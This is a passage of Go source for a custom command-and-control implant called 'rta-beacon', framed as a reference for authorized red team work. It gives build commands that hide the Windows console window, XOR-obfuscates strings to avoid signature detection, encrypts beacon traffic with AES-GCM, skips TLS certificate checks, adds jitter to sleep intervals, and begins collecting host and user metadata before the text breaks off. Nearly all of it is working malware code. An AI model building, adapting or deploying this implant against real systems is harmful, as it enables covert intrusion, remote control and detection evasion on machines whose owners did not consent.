// rta-beacon — custom Go implant for authorized red team engagements.
//
// Educational reference implementation. For use only in authorized
// penetration tests, red team engagements, and CTF competitions.
//
// Pairs with rta-c2 (see scripts/rta-infra/c2-server/server.py).
//
// Build:
//   go build -trimpath -ldflags="-s -w -X main.c2URL=https://api.example.io \
//            -X main.implantID=rta-$(openssl rand -hex 4) \
//            -X main.implantKeyB64=$(python3 derive_key.py rta-XXXXXXXX)" \
//            -o beacon
//
// On Windows:
//   GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w -H=windowsgui ..." -o beacon.exe
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// ----------------------------------------------------------------------------
// Build-time configuration (injected via -ldflags -X).
// Defaults are placeholders so `go run` works during development.
// ----------------------------------------------------------------------------

var (
	c2URL         = "https://127.0.0.1:8443"
	implantID     = "rta-dev00001"
	implantKeyB64 = "" // base64 32-byte key; if empty, dev key is used

	// Beacon timing — overridden at build time per engagement.
	sleepSeconds  = "30"
	jitterPercent = "40"

	// XOR-obfuscated strings to avoid static signatures on the binary.
	// (This is not a substitute for proper string encryption; it only
	// defeats `strings <file> | grep` style triage.)
	xorKey = byte(0x5a)
)

// ----------------------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------------------

// deob decodes an XOR-obfuscated string literal.
func deob(b []byte) string {
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ xorKey
	}
	return string(out)
}

func implantKey() []byte {
	if implantKeyB64 == "" {
		// Dev default — matches the Python dev key used in CI tests.
		// Production builds always override this.
		raw := make([]byte, 32)
		copy(raw, []byte("rta-dev-fallback-key-do-not-use!"))
		return raw
	}
	k, err := base64.StdEncoding.DecodeString(implantKeyB64)
	if err != nil || len(k) != 32 {
		os.Exit(0)
	}
	return k
}

func encrypt(key, plaintext []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return ""
	}
	ct := gcm.Seal(nil, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ct...))
}

func decrypt(key []byte, payload string) ([]byte, error) {
	raw, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(raw) < gcm.NonceSize() {
		return nil, fmt.Errorf("short")
	}
	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

// httpClient returns a TLS client that ignores cert validation — the
// cert on the team server is self-signed; the public-facing cert on
// the redirector is real. For higher OPSEC, pin the redirector cert.
func httpClient() *http.Client {
	return &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
			},
		},
	}
}

// sleepWithJitter sleeps for base +/- jitter%. A real implant should
// obfuscate the sleep itself (Ekko, Foliage, etc.) — this demo uses
// time.Sleep to keep the code reviewable.
func sleepWithJitter(base int, pct int) {
	if pct <= 0 {
		time.Sleep(time.Duration(base) * time.Second)
		return
	}
	delta := (base * pct) / 100
	offset := mrand.Intn(2*delta+1) - delta
	dur := time.Duration(base+offset) * time.Second
	if dur < time.Second {
		dur = time.Second
	}
	time.Sleep(dur)
}

// ----------------------------------------------------------------------------
// Host metadata
// ----------------------------------------------------------------------------

type checkin struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

func gatherMetadata() checkin {
	host, _ := os.Hostname()
	u, _ := user.Current()
	name := ""
	if u !=